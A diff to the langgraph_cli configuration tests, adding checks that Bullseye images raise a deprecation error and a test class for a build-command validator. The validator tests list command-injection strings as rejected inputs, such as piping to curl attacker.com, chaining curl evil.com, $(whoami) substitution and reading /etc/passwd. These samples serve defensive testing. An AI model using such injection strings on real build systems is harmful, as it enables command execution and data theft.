@@ -14,6 +14,7 @@ from langgraph_cli.config import (
     config_to_compose,
     config_to_docker,
     docker_tag,
+    has_disallowed_build_command_content,
     validate_config,
     validate_config_file,
 )
@@ -120,14 +121,14 @@ def test_validate_config():
         validate_config({"python_version": "3.10"})
     assert "Minimum required version" in str(exc_info.value)
 
-    config = validate_config(
-        {
-            "python_version": "3.11-bullseye",
-            "dependencies": ["."],
-            "graphs": {"agent": "./agent.py:graph"},
-        }
-    )
-    assert config["python_version"] == "3.11-bullseye"
+    with pytest.raises(click.UsageError, match="Bullseye images were deprecated"):
+        validate_config(
+            {
+                "python_version": "3.11-bullseye",
+                "dependencies": ["."],
+                "graphs": {"agent": "./agent.py:graph"},
+            }
+        )
 
     config = validate_config(
         {
@@ -180,6 +181,17 @@ def test_validate_config_image_distro():
         }
     )
     assert config["image_distro"] == "debian"
+
+    # Bullseye should raise deprecation error
+    with pytest.raises(click.UsageError, match="Bullseye images were deprecated"):
+        validate_config(
+            {
+                "python_version": "3.11",
+                "dependencies": ["."],
+                "graphs": {"agent": "./agent.py:graph"},
+                "image_distro": "bullseye",
+            }
+        )
 
     # Invalid image_distro values should raise error
     with pytest.raises(click.UsageError) as exc_info:
@@ -1681,3 +1693,49 @@ def test_config_to_compose_with_api_version():
 
     # Check that the compose file includes the correct FROM line with api_version
     assert "FROM langchain/langgraphjs-api:0.2.74-node20" in actual_compose_str
+
+
+class TestHasDisallowedBuildCommandContent:
+    """Tests for has_disallowed_build_command_content."""
+
+    @pytest.mark.parametrize(
+        "char",
+        ['"', "`", "\\", "\n", "\r", "\0", "\t", "|", ";", "$", ">", "<"],
+    )
+    def test_disallowed_chars_rejected(self, char: str) -> None:
+        assert has_disallowed_build_command_content(f"npm install{char}some-package")
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            "pip install foo | curl attacker.com",
+            "npm install; curl evil.com",
+            "pip install $(whoami)",
+            "pip install ${IFS}evil",
+            "curl evil.com & disown",
+            "npm install & curl evil.com",
+            "pip install > /dev/null",
+            "cat < /etc/passwd",
+        ],
+    )
+    def test_injection_patterns_rejected(self, cmd: str) -> None:
+        assert has_disallowed_build_command_content(cmd)
+
+    def test_single_ampersand_rejected(self) -> None:
+        assert has_disallowed_build_command_content("npm install & curl evil.com")
+
+    def test_double_ampersand_allowed(self) -> None:
+        assert not has_disallowed_build_command_content("npm install && npm run build")
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            "npm install",
+            "pnpm install --frozen-lockfile",
+            "next build && next export",
+            "npm ci && npm run build",
+            "pip install -e '.[dev]'",
+        ],
+    )
+    def test_valid_commands_allowed(self, cmd: str) -> None:
+        assert not has_disallowed_build_command_content(cmd)
